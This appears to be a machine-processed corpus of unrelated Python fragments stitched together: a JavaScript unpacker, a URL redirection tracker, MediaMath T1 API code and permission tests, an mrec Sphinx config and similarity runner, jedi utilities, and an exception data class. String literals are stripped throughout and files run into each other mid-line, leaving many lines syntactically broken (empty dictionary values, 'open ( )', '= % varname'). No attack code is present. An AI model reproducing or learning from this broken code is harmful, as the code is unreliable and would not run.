~~~ return args [ 0 ] , args [ 3 ] . split ( ) , int ( args [ 1 ] ) , int ( args [ 2 ] ) \n 
~~ except ValueError : \n 
~~~ raise UnpackingError ( ) \n 
\n 
~~ ~~ def _replacestrings ( source ) : \n 
~~~ """Strip string lookup table (list) and replace values in source.""" \n 
match = re . search ( r\'var *(_\\w+)\\=\\["(.*?)"\\];\' , source , re . DOTALL ) \n 
\n 
if match : \n 
~~~ varname , strings = match . groups ( ) \n 
startpoint = len ( match . group ( 0 ) ) \n 
lookup = strings . split ( \'","\' ) \n 
variable = % varname \n 
for index , value in enumerate ( lookup ) : \n 
~~~ source = source . replace ( variable % index , \'"%s"\' % value ) \n 
~~ return source [ startpoint : ] \n 
~~ return source \n 
\n 
\n 
~~ class Unbaser ( object ) : \n 
~~~ """Functor for a given base. Will efficiently convert\n    strings to natural numbers.""" \n 
ALPHABET = { \n 
62 : , \n 
95 : ( \' !"#$%&\\\'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ\' \n 
) \n 
} \n 
\n 
def __init__ ( self , base ) : \n 
~~~ self . base = base \n 
\n 
# If base can be handled by int() builtin, let it do it for us \n 
if 2 <= base <= 36 : \n 
~~~ self . unbase = lambda string : int ( string , base ) \n 
~~ else : \n 
# Build conversion dictionary cache \n 
~~~ try : \n 
~~~ self . dictionary = dict ( ( cipher , index ) for \n 
index , cipher in enumerate ( self . ALPHABET [ base ] ) ) \n 
~~ except KeyError : \n 
~~~ raise TypeError ( ) \n 
\n 
~~ self . unbase = self . _dictunbaser \n 
\n 
~~ ~~ def __call__ ( self , string ) : \n 
~~~ return self . unbase ( string ) \n 
\n 
~~ def _dictunbaser ( self , string ) : \n 
~~~ """Decodes a  value to an integer.""" \n 
ret = 0 \n 
for index , cipher in enumerate ( string [ : : - 1 ] ) : \n 
~~~ ret += ( self . base ** index ) * self . dictionary [ cipher ] \n 
~~ return ret \n 
~~ ~~ import os , sys \n 
parentdir = os . path . dirname ( __file__ ) \n 
sys . path . insert ( 0 , parentdir ) \n 
import executemechanize \n 
\n 
class redirection : \n 
\n 
~~~ def createarray ( self ) : \n 
~~~ setattr ( self , "redirection_list" , [ ] ) \n 
\n 
~~ def appendurl ( self , url ) : \n 
~~~ url = str ( url ) \n 
if not url . endswith ( ".js" ) or url . endswith ( ".json" ) : \n 
~~~ self . redirection_list . append ( url ) ; \n 
self . passarray ( ) \n 
\n 
~~ ~~ def passarray ( self ) : \n 
~~~ executemechanize . set_redirection_list ( self . redirection_list ) \n 
# Copyright (C) 2014 MediaMath, Inc. <http://www.mediamath.com> \n 
# \n 
# Licensed under the Apache License, Version 2.0 (the "License"); \n 
# you may not use this file except in compliance with the License. \n 
# You may obtain a copy of the License at \n 
# \n 
#     http://www.apache.org/licenses/LICENSE-2.0 \n 
# \n 
# Unless required by applicable law or agreed to in writing, software \n 
# distributed under the License is distributed on an "AS IS" BASIS, \n 
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. \n 
# See the License for the specific language governing permissions and \n 
# limitations under the License. \n 
\n 
~~ ~~ SQL_PORT = 15000 \n 
ZMQ_RPC_PORT = 15598 \n 
HTTP_PORT = 15597 \n 
HTTPS_PORT = 443 \n 
ZMQ_PUBSUB_PORT = 15596 \n 
# -*- coding: utf-8 -*- \n 
\n 
__author__ = \n 
__copyright__ = \n 
__license__ = \n 
__version__ = \n 
__maintainer__ = \n 
__email__ = \n 
__status__ = \n 
# -*- coding: utf-8 -*- \n 
"""Provides strategy concept object.""" \n 
\n 
from __future__ import absolute_import \n 
from . . config import PATHS \n 
from . . entity import Entity \n 
\n 
\n 
class StrategyConcept ( Entity ) : \n 
~~~ """docstring for StrategyConcept.""" \n 
collection = \n 
resource = \n 
_relations = { \n 
, \n 
, \n 
} \n 
_pull = { \n 
: int , \n 
: Entity . _strpt , \n 
: int , \n 
: Entity . _int_to_bool , \n 
: int , \n 
: Entity . _strpt , \n 
: int , \n 
} \n 
_push = _pull . copy ( ) \n 
_push . update ( { \n 
: int , \n 
} ) \n 
_readonly = Entity . _readonly | { , } \n 
\n 
def __init__ ( self , session , properties = None , ** kwargs ) : \n 
~~~ super ( StrategyConcept , self ) . __init__ ( session , properties , ** kwargs ) \n 
\n 
~~ def remove ( self ) : \n 
~~~ """Unassign the concept from the strategy.""" \n 
url = . join ( [ self . collection , \n 
str ( self . id ) , \n 
] ) \n 
self . _post ( PATHS [ ] , rest = url , data = { : self . version } ) \n 
for item in list ( self . properties . keys ( ) ) : \n 
~~~ del self . properties [ item ] \n 
~~ ~~ ~~ from __future__ import print_function \n 
from __future__ import absolute_import \n 
\n 
import unittest \n 
import responses \n 
import requests \n 
from . requests_patch import patched_extract_cookies_to_jar \n 
\n 
from terminalone import T1 \n 
\n 
mock_credentials = { \n 
: , \n 
: , \n 
: , \n 
} \n 
\n 
API_BASE = \n 
\n 
requests . sessions . extract_cookies_to_jar = patched_extract_cookies_to_jar \n 
requests . adapters . extract_cookies_to_jar = patched_extract_cookies_to_jar \n 
\n 
\n 
class TestPermissions ( unittest . TestCase ) : \n 
~~~ def setup ( self ) : \n 
~~~ """set up test fixtures""" \n 
with open ( ) as f : \n 
~~~ fixture = f . read ( ) \n 
~~ responses . add ( responses . POST , , \n 
body = fixture , \n 
adding_headers = { \n 
: , \n 
} , \n 
content_type = ) \n 
\n 
self . t1 = T1 ( auth_method = , \n 
api_base = API_BASE , \n 
** mock_credentials ) \n 
\n 
~~ @ responses . activate \n 
def test_get_permissions ( self ) : \n 
~~~ self . setup ( ) \n 
with open ( ) as f : \n 
~~~ fixture = f . read ( ) \n 
~~ responses . add ( responses . GET , \n 
, \n 
body = fixture , \n 
content_type = , \n 
match_querystring = True ) \n 
\n 
p = self . t1 . get ( , 10000 , child = ) \n 
assert p . _type == , . format ( p . _type ) \n 
assert p . parent_id == 10000 , . format ( p . parent_id ) \n 
\n 
~~ @ responses . activate \n 
def test_remove_advertiser ( self ) : \n 
~~~ self . setup ( ) \n 
with open ( ) as f : \n 
~~~ fixture = f . read ( ) \n 
~~ responses . add ( responses . GET , \n 
, \n 
body = fixture , \n 
content_type = , \n 
match_querystring = True ) \n 
\n 
p = self . t1 . get ( , 10000 , child = ) \n 
remove_id = 6 \n 
assert remove_id in p . advertiser . keys ( ) , . format \n 
p . remove ( , 6 ) \n 
assert remove_id not in p . advertiser . keys ( ) , . format ( remove_id ) \n 
\n 
~~ @ responses . activate \n 
def test_it_should_remove_child_advertisers_when_removing_agency ( self ) : \n 
~~~ self . setup ( ) \n 
with open ( ) as f : \n 
~~~ fixture = f . read ( ) \n 
~~ responses . add ( responses . GET , \n 
, \n 
body = fixture , \n 
content_type = , \n 
match_querystring = True ) \n 
\n 
p = self . t1 . get ( , 10000 , child = ) \n 
remove_ids = [ 6 , 7 ] \n 
\n 
for ad_id in remove_ids : \n 
~~~ assert ad_id in p . advertiser . keys ( ) , . format \n 
~~ p . remove ( , 3 ) \n 
for ad_id in remove_ids : \n 
~~~ assert ad_id not in p . advertiser . keys ( ) , . format ( ad_id ) \n 
\n 
~~ ~~ @ responses . activate \n 
def test_it_should_remove_child_agencies_and_advertisers_when_removing_organization ( self ) : \n 
~~~ self . setup ( ) \n 
with open ( ) as f : \n 
~~~ fixture = f . read ( ) \n 
~~ responses . add ( responses . GET , \n 
, \n 
body = fixture , \n 
content_type = , \n 
match_querystring = True ) \n 
\n 
p = self . t1 . get ( , 10000 , child = ) \n 
remove_advertiser_ids = [ 8 , 9 , 10 ] \n 
remove_agency_ids = [ 4 , 5 ] \n 
for advertiser_id in remove_advertiser_ids : \n 
~~~ assert advertiser_id in p . advertiser . keys ( ) , ~~ for agency_id in remove_agency_ids : \n 
~~~ assert agency_id in p . agency . keys ( ) , . format ( agency_id \n 
~~ p . remove ( , 2 ) \n 
for advertiser_id in remove_advertiser_ids : \n 
~~~ assert advertiser_id not in p . advertiser . keys ( ) , . format ( advertiser_id ) \n 
\n 
~~ for agency_id in remove_agency_ids : \n 
~~~ assert agency_id not in p . agency . keys ( ) , . format ( agency_id ) \n 
\n 
~~ ~~ @ responses . activate \n 
def test_it_should_add_entity_ids_on_save ( self ) : \n 
~~~ self . setup ( ) \n 
with open ( ) as f : \n 
~~~ fixture = f . read ( ) \n 
~~ responses . add ( responses . GET , \n 
, \n 
body = fixture , \n 
content_type = , \n 
match_querystring = True ) \n 
\n 
p = self . t1 . get ( , 10000 , child = ) \n 
p . add ( , 10 ) \n 
data = p . _generate_save_data ( ) \n 
assert sorted ( data [ ] ) == [ 1 , 2 , 10 ] , data [ ] \n 
\n 
~~ @ responses . activate \n 
def test_it_should_add_access_to_empty_permissions ( self ) : \n 
~~~ self . setup ( ) \n 
with open ( ) as f : \n 
~~~ fixture = f . read ( ) \n 
~~ responses . add ( responses . GET , \n 
, \n 
body = fixture , \n 
content_type = , \n 
match_querystring = True ) \n 
\n 
p = self . t1 . get ( , 10000 , child = ) \n 
p . add ( , 10 ) \n 
data = p . _generate_save_data ( ) \n 
assert sorted ( data [ ] ) == [ 10 ] , data [ ] \n 
~~ ~~ VERSION = ( 0 , 1 , 9 ) \n 
__version__ = "0.1.9" \n 
\n 
# -*- coding: utf-8 -*- \n 
# \n 
# mrec documentation build configuration file, created by \n 
# sphinx-quickstart on Fri Aug 30 16:35:35 2013. \n 
# \n 
# This file is execfile()d with the current directory set to its containing dir. \n 
# \n 
# Note that not all possible configuration values are present in this \n 
# autogenerated file. \n 
# \n 
# All configuration values have a default; values that are commented out \n 
# serve to show the default. \n 
\n 
import sys , os \n 
\n 
# If extensions (or modules to document with autodoc) are in another directory, \n 
# add these directories to sys.path here. If the directory is relative to the \n 
# documentation root, use os.path.abspath to make it absolute, like shown here. \n 
sys . path . insert ( 0 , os . path . abspath ( ) ) \n 
sys . path . insert ( 0 , os . path . abspath ( ) ) \n 
\n 
# -- General configuration ----------------------------------------------------- \n 
\n 
# If your documentation needs a minimal Sphinx version, state it here. \n 
needs_sphinx = \n 
\n 
# Add any Sphinx extension module names here, as strings. They can be extensions \n 
\n 
extensions = [ , , , ] \n 
\n 
# Add any paths that contain templates here, relative to this directory. \n 
templates_path = [ ] \n 
\n 
# The suffix of source filenames. \n 
source_suffix = \n 
\n 
# The encoding of source files. \n 
\n 
\n 
# The master toctree document. \n 
master_doc = \n 
\n 
# General information about the project. \n 
project = \n 
copyright = \n 
\n 
\n 
# |version| and |release|, also used in various other places throughout the \n 
# built documents. \n 
import pkg_resources \n 
try : \n 
~~~ release = pkg_resources . get_distribution ( ) . version \n 
~~ except pkg_resources . DistributionNotFound : \n 
~~~ print \n 
print \n 
print \'development environment or run "python setup.py develop" to setup\' \n 
print \n 
sys . exit ( 1 ) \n 
~~ del pkg_resources \n 
version = . join ( release . split ( ) [ : 2 ] ) \n 
\n 
# The language for content autogenerated by Sphinx. Refer to documentation \n 
# for a list of supported languages. \n 
#language = None \n 
\n 
# There are two options for replacing |today|: either, you set today to some \n 
# non-false value, then it is used: \n 
\n 
# Else, today_fmt is used as the format for a strftime call. \n 
\n 
\n 
# List of patterns, relative to source directory, that match files and \n 
# directories to ignore when looking for source files. \n 
exclude_patterns = [ ] \n 
\n 
# The reST default role (used for this markup: `text`) to use for all documents. \n 
#default_role = None \n 
\n 
\n 
#add_function_parentheses = True \n 
\n 
# If true, the current module name will be prepended to all description \n 
# unit titles (such as .. function::). \n 
#add_module_names = True \n 
\n 
# If true, sectionauthor and moduleauthor directives will be shown in the \n 
# output. They are ignored by default. \n 
#show_authors = False \n 
\n 
# The name of the Pygments (syntax highlighting) style to use. \n 
pygments_style = \n 
\n 
# A list of ignored prefixes for module index sorting. \n 
#modindex_common_prefix = [] \n 
\n 
\n 
# -- Options for HTML output --------------------------------------------------- \n 
\n 
# The theme to use for HTML and HTML Help pages.  See the documentation for \n 
# a list of builtin themes. \n 
html_theme = \n 
\n 
# Theme options are theme-specific and customize the look and feel of a theme \n 
# further.  For a list of options available for each theme, see the \n 
# documentation. \n 
#html_theme_options = {} \n 
\n 
# Add any paths that contain custom themes here, relative to this directory. \n 
#html_theme_path = [] \n 
\n 
# The name for this set of Sphinx documents.  If None, it defaults to \n 
# "<project> v<release> documentation". \n 
#html_title = None \n 
\n 
# A shorter title for the navigation bar.  Default is the same as html_title. \n 
#html_short_title = None \n 
\n 
# The name of an image file (relative to this directory) to place at the top \n 
# of the sidebar. \n 
#html_logo = None \n 
\n 
# The name of an image file (within the static path) to use as favicon of the \n 
# docs.  This file should be a Windows icon file (.ico) being 16x16 or 32x32 \n 
# pixels large. \n 
#html_favicon = None \n 
\n 
# Add any paths that contain custom static files (such as style sheets) here, \n 
# relative to this directory. They are copied after the builtin static files, \n 
# so a file named "default.css" will overwrite the builtin "default.css". \n 
html_static_path = [ ] \n 
\n 
\n 
# using the given strftime format. \n 
\n 
\n 
# If true, SmartyPants will be used to convert quotes and dashes to \n 
# typographically correct entities. \n 
html_use_smartypants = True \n 
\n 
# Custom sidebar templates, maps document names to template names. \n 
#html_sidebars = {} \n 
\n 
# Additional templates that should be rendered to pages, maps page names to \n 
# template names. \n 
#html_additional_pages = {} \n 
\n 
# If false, no module index is generated. \n 
#html_domain_indices = True \n 
\n 
# If false, no index is generated. \n 
#html_use_index = True \n 
\n 
# If true, the index is split into individual pages for each letter. \n 
#html_split_index = False \n 
\n 
# If true, links to the reST sources are added to the pages. \n 
#html_show_sourcelink = True \n 
\n 
# If true, "Created using Sphinx" is shown in the HTML footer. Default is True. \n 
#html_show_sphinx = True \n 
\n 
# If true, "(C) Copyright ..." is shown in the HTML footer. Default is True. \n 
#html_show_copyright = True \n 
\n 
# If true, an OpenSearch description file will be output, and all pages will \n 
# contain a <link> tag referring to it.  The value of this option must be the \n 
# base URL from which the finished HTML is served. \n 
\n 
\n 
# This is the file name suffix for HTML files (e.g. ".xhtml"). \n 
#html_file_suffix = None \n 
\n 
# Output file base name for HTML help builder. \n 
htmlhelp_basename = \n 
\n 
\n 
# -- Options for LaTeX output -------------------------------------------------- \n 
\n 
latex_elements = { \n 
\n 
\n 
\n 
\n 
\n 
\n 
# Additional stuff for the LaTeX preamble. \n 
\n 
} \n 
\n 
# Grouping the document tree into LaTeX files. List of tuples \n 
# (source start file, target name, title, author, documentclass [howto/manual]). \n 
latex_documents = [ \n 
( , , , \n 
, ) , \n 
] \n 
\n 
# The name of an image file (relative to this directory) to place at the top of \n 
# the title page. \n 
#latex_logo = None \n 
\n 
# For "manual" documents, if this is true, then toplevel headings are parts, \n 
# not chapters. \n 
#latex_use_parts = False \n 
\n 
# If true, show page references after internal links. \n 
#latex_show_pagerefs = False \n 
\n 
# If true, show URL addresses after external links. \n 
#latex_show_urls = False \n 
\n 
# Documents to append as an appendix to all manuals. \n 
#latex_appendices = [] \n 
\n 
# If false, no module index is generated. \n 
#latex_domain_indices = True \n 
\n 
\n 
# -- Options for manual page output -------------------------------------------- \n 
\n 
# One entry per manual page. List of tuples \n 
# (source start file, name, description, authors, manual section). \n 
man_pages = [ \n 
( , , , \n 
[ ] , 1 ) \n 
] \n 
\n 
# If true, show URL addresses after external links. \n 
#man_show_urls = False \n 
\n 
\n 
# -- Options for Texinfo output ------------------------------------------------ \n 
\n 
# Grouping the document tree into Texinfo files. List of tuples \n 
# (source start file, target name, title, author, \n 
#  dir menu entry, description, category) \n 
texinfo_documents = [ \n 
( , , , \n 
, , , \n 
) , \n 
] \n 
\n 
# Documents to append as an appendix to all manuals. \n 
#texinfo_appendices = [] \n 
\n 
# If false, no module index is generated. \n 
#texinfo_domain_indices = True \n 
\n 
\n 
\n 
import math \n 
import glob \n 
import re \n 
import os \n 
import subprocess \n 
from shutil import rmtree \n 
import logging \n 
\n 
from mrec import load_sparse_matrix , save_recommender \n 
\n 
class ItemSimilarityRunner ( object ) : \n 
\n 
~~~ def run ( self , view , model , input_format , trainfile , num_engines , simsdir , overwrite , max_sims , simsfile , modelfile \n 
~~~ logging . info ( ) \n 
dataset = load_sparse_matrix ( input_format , trainfile ) \n 
num_users , num_items = dataset . shape \n 
del dataset \n 
logging . info ( , num_users , num_items ) \n 
\n 
logging . info ( . format ( simsdir ) ) \n 
subprocess . check_call ( [ , , simsdir ] ) \n 
\n 
done = [ ] \n 
if not overwrite : \n 
~~~ logging . info ( ) \n 
done . extend ( self . find_done ( simsdir ) ) \n 
if done : \n 
~~~ logging . info ( . format ( len ( done ) ) ) \n 
\n 
~~ ~~ logging . info ( ) \n 
tasks = self . create_tasks ( model , input_format , trainfile , simsdir , num_items , num_engines , max_sims \n 
if num_engines > 0 : \n 
~~~ logging . info ( \n 
, len ( tasks ) ) \n 
async_job = view . map_async ( process , tasks , retries = 2 ) \n 
# wait for tasks to complete \n 
results = async_job . get ( ) \n 
~~ else : \n 
# Sequential run to make it easier for debugging \n 
~~~ logging . info ( ) \n 
results = [ process ( task ) for task in tasks ] \n 
\n 
~~ logging . info ( ) \n 
done = self . find_done ( simsdir ) \n 
remaining = len ( tasks ) - len ( done ) \n 
if remaining == 0 : \n 
~~~ logging . info ( ) \n 
logging . info ( . format ( len ( done ) ) ) \n 
paths = [ os . path . join ( simsdir , . format ( start , end ) ) for start , end in done cmd = [ ] + paths \n 
subprocess . check_call ( cmd , stdout = open ( simsfile , ) ) \n 
logging . info ( ) \n 
rmtree ( simsdir ) \n 
logging . info ( , \n 
num_items , type ( model ) . __name__ , simsfile ) \n 
model . load_similarity_matrix ( simsfile , num_items ) \n 
save_recommender ( model , modelfile ) \n 
logging . info ( ) \n 
~~ else : \n 
~~~ logging . error ( . format ( remaining , len logging . error ( ) \n 
\n 
~~ ~~ def find_done ( self , outdir ) : \n 
~~~ success_files = glob . glob ( os . path . join ( outdir , ) ) \n 
r = re . compile ( ) \n 
done = [ ] \n 
for path in success_files : \n 
~~~ m = r . match ( path ) \n 
start = int ( m . group ( 1 ) ) \n 
end = int ( m . group ( 2 ) ) \n 
done . append ( ( start , end ) ) \n 
~~ return done \n 
\n 
~~ def create_tasks ( self , model , input_format , trainfile , outdir , num_items , num_engines , max_similar_items ~~~ if num_engines == 0 : \n 
# special marker for sequential run \n 
~~~ num_engines = 1 \n 
~~ items_per_engine = int ( math . ceil ( float ( num_items ) / num_engines ) ) \n 
tasks = [ ] \n 
for start in xrange ( 0 , num_items , items_per_engine ) : \n 
~~~ end = min ( num_items , start + items_per_engine ) \n 
if ( start , end ) not in done : \n 
~~~ tasks . append ( ( model , input_format , trainfile , outdir , start , end , max_similar_items ) ) \n 
~~ ~~ return tasks \n 
\n 
~~ ~~ def process ( task ) : \n 
~~~ """\n    Training task to run on an ipython engine.\n    """ \n 
\n 
# import modules required by engine \n 
import os \n 
import subprocess \n 
from mrec import load_fast_sparse_matrix \n 
\n 
model , input_format , trainfile , outdir , start , end , max_similar_items = task \n 
\n 
# initialise the model \n 
dataset = load_fast_sparse_matrix ( input_format , trainfile ) \n 
if hasattr ( model , ) : \n 
# clear out any existing similarity matrix to trigger recomputation of \n 
\n 
~~~ model . similarity_matrix = None \n 
\n 
# write sims directly to file as we compute them \n 
~~ outfile = os . path . join ( outdir , . format ( start , end ) ) \n 
out = open ( outfile , ) \n 
for j in xrange ( start , end ) : \n 
~~~ w = model . get_similar_items ( j , max_similar_items = max_similar_items , dataset = dataset ) \n 
for k , v in w : \n 
~~~ print >> out , . format ( j + 1 , k + 1 , v ) # write as 1-indexed \n 
~~ ~~ out . close ( ) \n 
\n 
# record success \n 
cmd = [ , os . path . join ( outdir , . format ( start , end ) ) ] \n 
subprocess . check_call ( cmd ) \n 
\n 
\n 
return start , end \n 
~~ """\n- the popular ``memoize_default`` works like a typical memoize and returns the\n  default otherwise.\n- ``CachedMetaClass`` uses ``memoize_default`` to do the same with classes.\n""" \n 
\n 
import inspect \n 
\n 
NO_DEFAULT = object ( ) \n 
\n 
\n 
def memoize_default ( default = NO_DEFAULT , evaluator_is_first_arg = False , second_arg_is_evaluator = False ) ~~~ """ This is a typical memoization decorator, BUT there is one difference:\n    To prevent recursion it sets defaults.\n\n    Preventing recursion is in this case the much bigger use than speed. I\n    don\'t think, that there is a big speed difference, but there are many cases\n    where recursion could happen (think about a = b; b = a).\n    """ \n 
def func ( function ) : \n 
~~~ def wrapper ( obj , * args , ** kwargs ) : \n 
~~~ if evaluator_is_first_arg : \n 
~~~ cache = obj . memoize_cache \n 
~~ elif second_arg_is_evaluator : # needed for meta classes \n 
~~~ cache = args [ 0 ] . memoize_cache \n 
~~ else : \n 
~~~ cache = obj . _evaluator . memoize_cache \n 
\n 
~~ try : \n 
~~~ memo = cache [ function ] \n 
~~ except KeyError : \n 
~~~ memo = { } \n 
cache [ function ] = memo \n 
\n 
~~ key = ( obj , args , frozenset ( kwargs . items ( ) ) ) \n 
if key in memo : \n 
~~~ return memo [ key ] \n 
~~ else : \n 
~~~ if default is not NO_DEFAULT : \n 
~~~ memo [ key ] = default \n 
~~ rv = function ( obj , * args , ** kwargs ) \n 
if inspect . isgenerator ( rv ) : \n 
~~~ rv = list ( rv ) \n 
~~ memo [ key ] = rv \n 
return rv \n 
~~ ~~ return wrapper \n 
~~ return func \n 
\n 
\n 
~~ class CachedMetaClass ( type ) : \n 
~~~ """\n    This is basically almost the same than the decorator above, it just caches\n    class initializations. Either you do it this way or with decorators, but\n    with decorators you lose class access (isinstance, etc).\n    """ \n 
@ memoize_default ( None , second_arg_is_evaluator = True ) \n 
def __call__ ( self , * args , ** kwargs ) : \n 
~~~ return super ( CachedMetaClass , self ) . __call__ ( * args , ** kwargs ) \n 
~~ ~~ """\nUtilities for end-users.\n""" \n 
\n 
from __future__ import absolute_import \n 
import __main__ \n 
from collections import namedtuple \n 
import re \n 
import os \n 
import sys \n 
\n 
from jedi import Interpreter \n 
from jedi . api . helpers import completion_parts \n 
from jedi . parser . user_context import UserContext \n 
\n 
\n 
def setup_readline ( namespace_module = __main__ ) : \n 
~~~ """\n    Install Jedi completer to :mod:`readline`.\n\n    This function setups :mod:`readline` to use Jedi in Python interactive\n    shell.  If you want to use a custom ``PYTHONSTARTUP`` file (typically\n    ``$HOME/.pythonrc.py``), you can add this piece of code::\n\n        try:\n            from jedi.utils import setup_readline\n            setup_readline()\n        except ImportError:\n            # Fallback to the stdlib readline completer if it is installed.\n            # Taken from http://docs.python.org/2/library/rlcompleter.html\n            print("Jedi is not installed, falling back to readline")\n            try:\n                import readline\n                import rlcompleter\n                readline.parse_and_bind("tab: complete")\n            except ImportError:\n                print("Readline is not installed either. No tab completion is enabled.")\n\n    This will fallback to the readline completer if Jedi is not installed.\n    The readline completer will only complete names in the global namespace,\n    so for example::\n\n        ran<TAB>\n\n    will complete to ``range``\n\n    with both Jedi and readline, but::\n\n        range(10).cou<TAB>\n\n    will show complete to ``range(10).count`` only with Jedi.\n\n    You\'ll also need to add ``export PYTHONSTARTUP=$HOME/.pythonrc.py`` to\n    your shell profile (usually ``.bash_profile`` or ``.profile`` if you use\n    bash).\n\n    """ \n 
class JediRL ( object ) : \n 
~~~ def complete ( self , text , state ) : \n 
~~~ """\n            This complete stuff is pretty weird, a generator would make\n            a lot more sense, but probably due to backwards compatibility\n            this is still the way how it works.\n\n            The only important part is stuff in the ``state == 0`` flow,\n            everything else has been copied from the ``rlcompleter`` std.\n            library module.\n            """ \n 
if state == 0 : \n 
~~~ sys . path . insert ( 0 , os . getcwd ( ) ) \n 
\n 
try : \n 
~~~ interpreter = Interpreter ( text , [ namespace_module . __dict__ ] ) \n 
\n 
path = UserContext ( text , ( 1 , len ( text ) ) ) . get_path_until_cursor ( ) \n 
path , dot , like = completion_parts ( path ) \n 
before = text [ : len ( text ) - len ( like ) ] \n 
completions = interpreter . completions ( ) \n 
~~ finally : \n 
~~~ sys . path . pop ( 0 ) \n 
\n 
~~ self . matches = [ before + c . name_with_symbols for c in completions ] \n 
~~ try : \n 
~~~ return self . matches [ state ] \n 
~~ except IndexError : \n 
~~~ return None \n 
\n 
~~ ~~ ~~ try : \n 
~~~ import readline \n 
~~ except ImportError : \n 
~~~ print ( "Module readline not available." ) \n 
~~ else : \n 
~~~ readline . set_completer ( JediRL ( ) . complete ) \n 
readline . parse_and_bind ( "tab: complete" ) \n 
# jedi itself does the case matching \n 
readline . parse_and_bind ( "set completion-ignore-case on" ) \n 
\n 
readline . parse_and_bind ( "set show-all-if-unmodified" ) \n 
readline . parse_and_bind ( "set show-all-if-ambiguous on" ) \n 
\n 
readline . parse_and_bind ( "set completion-prefix-display-length 2" ) \n 
# No delimiters, Jedi handles that. \n 
readline . set_completer_delims ( ) \n 
\n 
\n 
~~ ~~ def version_info ( ) : \n 
~~~ """\n    Returns a namedtuple of Jedi\'s version, similar to Python\'s\n    ``sys.version_info``.\n    """ \n 
Version = namedtuple ( , ) \n 
from jedi import __version__ \n 
tupl = re . findall ( , __version__ ) \n 
return Version ( * [ x if i == 3 else int ( x ) for i , x in enumerate ( tupl ) ] ) \n 
~~ import collections \n 
import copy \n 
from . Utils import _write_complex_object \n 
\n 
class ExceptionDetails ( object ) : \n 
~~~ """Data contract class for type ExceptionDetails.\n    """ \n 
_defaults = collections . OrderedDict ( [ \n 
( , None ) , \n 
( , None ) , \n 
( , None ) , \n 
( , None ) , \n 
( , True ) , \n 
( , None ) , \n 
( , [ ] ) \n 
] ) \n 
\n 
def __init__ ( self ) : \n 
~~~ """Initializes a new instance of the class.\n        """ \n 
self . _values = { \n 
: None , \n 
: None , \n 
: True , \n 
} \n 
self . _initialize ( ) \n 
\n 
~~ @ property \n 
def id ( self ) : \n 
~~~ """The id property.\n        \n        Returns:\n            (int). the property value. (defaults to: None)\n        """ \n 
if in self . _values : \n 
~~~ return self . _values [ ] \n 
~~ return self . _defaults [ ] \n 
\n 
~~ @ id . setter \n 
def id ( self , value ) : \n 
~~~ """The id property.\n        \n        Args:\n            value (int). the property value.\n        """ \n 
if value == self . _defaults [ ] and in self . _values : \n 
~~~ del self . _values [ ] \n 
~~ else : \n 
~~~ self . _values [ ] = value \n 
\n 
~~ ~~ @ property \n 
def outer_id ( self ) : \n 
~~~ """The outer_id property.\n        \n        Returns:\n            (int). the property value. (defaults to: None)\n        """ \n 
if in self . _values : \n 
~~~ return self . _values [ ] \n 
~~ return self . _defaults [ ] \n 
\n 
~~ @ outer_id . setter \n 
def outer_id ( self , value ) : \n 
~~~ """The outer_id property.\n        \n        Args:\n            value (int). the property value.\n        """ \n 
if value == self . _defaults [ ] and in self . _values : \n 
~~~ del self . _values [ ] \n 
~~ else : \n 
~~~ self . _values [ ] = value \n 
\n 
~~ ~~ @ property \n 
def type_name ( self ) : \n 
~~~ """The type_name property.\n        \n        Returns:\n            (string). the property value. (defaults to: None)\n        """ \n 
return self . _values [ ] \n 
\n 
~~ @ type_name . setter \n 
def type_name ( self , value ) : \n 
~~~ """The type_name property.\n        \n        Args:\n            value (string). the property value.\n        """ \n 
self . _values [ ] = value \n 
\n 
~~ @ property \n 
def message ( self ) : \n 
~~~ """The message property.\n        \n        Returns:\n            (string). the property value. (defaults to: None)\n        """ \n 
return self . _values [ ] \n 
\n 
~~ @ message . setter \n 
def message ( self , value ) : \n 
~~~ """The message property.\n        \n        Args:\n            value (string). the property value.\n        """ \n 
self . _values [ ] = value \n 
\n 
~~ @ property \n 
def has_full_stack ( self ) : \n 
~~~ """The has_full_stack property.\n        \n        Returns:\n            (bool). the property value. (defaults to: True)\n        """ \n 
if in self . _values : \n 
~~~ return self . _values [ ] \n 
~~ return self . _defaults [ ] \n 
\n 
~~ @ has_full_stack . setter \n 
def has_full_stack ( self , value ) : \n 
~~~ """The has_full_stack property.\n        \n        Args:\n            value (bool). the property value.\n        """ \n 
if value == self . _defaults [ ] and in self . _values : \n 
~~~ del self . _values [ ] \n 
~~ else : \n 
~~~ self . _values [ ] = value \n 
\n 
~~ ~~ @ property \n 
def stack ( self ) : \n 
~~~ """The stack property.\n        \n        Returns:\n            (string). the property value. (defaults to: None)\n        """ \n 
if in self . _values : \n 
~~~ return self . _values [ ] \n 
~~ return self . _defaults [ ] \n 
\n 
~~ @ stack . setter \n 
def stack ( self , value ) : \n 
~~~ """The stack property.\n        \n        Args:\n            value (string). the property value.\n        """ \n 
if value == self . _defaults [ ] and in self . _values : \n 
~~~ del self . _values [ ] \n 
~~ else : \n 
~~~ self . _values [ ] = value \n 
\n 
~~ ~~ @ property \n 
def parsed_stack ( self ) : \n 
~~~ """The parsed_stack property.\n        \n        Returns:\n            (list). the property value. (defaults to: [])\n        """ \n 
if in self . _values : \n 
~~~ return self . _values [ ] \n 
~~ self . _values [ ] = copy . deepcopy ( self . _defaults [ ] ) \n 
return self . _values [ ] \n 
\n 
~~ @ parsed_stack . setter \n 
def parsed_stack ( self , value ) : \n 
~~~ """The parsed_stack property.\n        \n        Args:\n            value (list). the property value.\n        """ \n 
if value == self . _defaults [ ] and in self . _values : \n 
~~~ del self . _values [ ] \n 
~~ else : \n 
~~~ self . _values [ ] = value \n 
\n 
~~ ~~ def _initialize ( self ) : \n 
~~~ """Initializes the current instance of the object.\n        """ \n 
pass \n 
\n 
~~ def write ( self ) : \n 
~~~ """Writes the contents of this object and returns the content as a dict object.\n        \n        Returns:\n            (dict). the object that represents the same data as the current instance.\n        """ \n 
return _write_complex_object ( self . _defaults , self . _values ) \n 
\n 
~~ ~~ import random \n 
import unittest \n 
import time \n 
import threading \n 
\n 
try : \n 
# Python 2.x \n 
~~~ import BaseHTTPServer as HTTPServer \n 
~~ except ImportError : \n 
# Python 3.x \n 
~~~ import http . server as HTTPServer \n 
\n 
~~ import sys , os , os . path \n 
rootDirectory = os . path . join ( os . path . dirname ( os . path . realpath ( __file__ ) ) , , ) \n 
if rootDirectory not in sys . path : \n 
~~~ sys . path . append ( rootDirectory ) \n 
\n 
